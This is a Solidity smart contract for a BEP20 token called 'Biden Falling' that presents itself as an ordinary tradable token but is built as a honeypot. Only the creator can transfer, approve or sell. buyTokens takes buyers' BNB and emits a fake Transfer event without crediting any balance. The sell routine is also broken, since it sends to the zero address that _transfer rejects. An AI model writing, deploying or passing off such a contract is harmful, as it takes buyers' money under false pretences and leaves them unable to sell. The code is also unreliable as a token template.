// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BidenFalling is IBEP20 {
    string public constant name = "Biden Falling";
    string public constant symbol = "BFALL";
    uint8 public constant decimals = 18;
    uint256 private constant _totalSupply = 100000000 * 10**uint256(decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _whitelisted;
    mapping(address => uint256) private _purchaseTimestamp;

    address private _creator;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _whitelisted[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);

        _creator = msg.sender;
    }

    modifier onlyCreator() {
        require(msg.sender == _creator, "Only the creator can call this function");
        _;
    }

    modifier onlyWhitelisted() {
        require(_whitelisted[msg.sender], "Address not whitelisted");
        _;
    }

    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override onlyCreator returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override onlyCreator returns (bool) {
        _approve(msg.sender, spender, amount);
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override onlyCreator returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function buyTokens() external payable {
        require(!_whitelisted[msg.sender], "Address already whitelisted");
        require(msg.value > 0, "Invalid amount");

        _whitelisted[msg.sender] = true;
        _purchaseTimestamp[msg.sender] = block.timestamp;
        emit Transfer(address(0), msg.sender, msg.value);
    }

    function sellTokens(uint256 amount) external onlyCreator {
        require(msg.sender == _creator, "Only the creator can call this function");
        require(_purchaseTimestamp[msg.sender] + 48 hours <= block.timestamp, "Cannot sell within 48 hours of purchase");

        _transfer(msg.sender, address(0), amount);
        emit Transfer(msg.sender, address(0), amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}